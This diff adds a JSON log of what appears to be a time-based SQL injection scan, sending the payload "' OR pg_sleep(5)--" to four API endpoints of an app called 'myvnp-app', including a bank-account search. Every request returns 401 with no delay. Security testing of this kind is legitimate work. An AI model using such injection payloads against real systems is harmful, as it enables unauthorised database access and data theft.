@@ -1,0 +1,30 @@
+[
+  {
+    "endpoint": "/myvnp-app/v1/contact/searchByParam",
+    "payload": "' OR pg_sleep(5)--",
+    "status": 401,
+    "time": 0.576202392578125,
+    "response": ""
+  },
+  {
+    "endpoint": "/myvnp-app/v1/UserBankAccount/searchByParameterApprove",
+    "payload": "' OR pg_sleep(5)--",
+    "status": 401,
+    "time": 0.5886006355285645,
+    "response": ""
+  },
+  {
+    "endpoint": "/myvnp-app/v1/McasEmployee/search",
+    "payload": "' OR pg_sleep(5)--",
+    "status": 401,
+    "time": 0.5707213878631592,
+    "response": ""
+  },
+  {
+    "endpoint": "/myvnp-app/v1/orders/search",
+    "payload": "' OR pg_sleep(5)--",
+    "status": 401,
+    "time": 0.5740580558776855,
+    "response": ""
+  }
+]
